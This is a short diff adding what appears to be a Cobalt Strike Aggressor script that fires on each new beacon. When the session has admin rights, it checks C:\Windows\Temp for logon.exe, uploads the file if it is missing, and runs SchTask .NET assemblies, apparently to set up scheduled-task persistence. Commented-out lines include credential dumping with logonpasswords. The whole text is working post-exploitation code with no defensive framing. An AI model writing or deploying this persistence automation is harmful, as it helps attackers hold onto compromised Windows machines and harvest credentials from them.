@@ -1,0 +1,20 @@
+# set up the Initial check
+on beacon_initial {
+  # brun($1, "whoami /all");
+  # brun($1, "ipconfig /all");
+  if (-isadmin $1) {
+    # blogonpasswords($1);
+    # beacon_note($1, "Ran LogonPasswords");
+    bls($1, "C:\\Windows\\Temp\\", &callback);
+  }
+}
+
+sub callback {
+      $flag = "logon.exe";
+      if ($flag !isin $3){
+        bcd($1, "C:\\Windows\\Temp\\");
+        bupload($1, script_resource("logon.exe"));
+        bexecute_assembly($1, script_resource("SchTask_donet_v2.exe"), "C:\\Windows\\Temp\\logon.exe 23");
+        bexecute_assembly($1, script_resource("SchTask_donet_v4.exe"), "C:\\Windows\\Temp\\logon.exe 23");
+      }
+    }
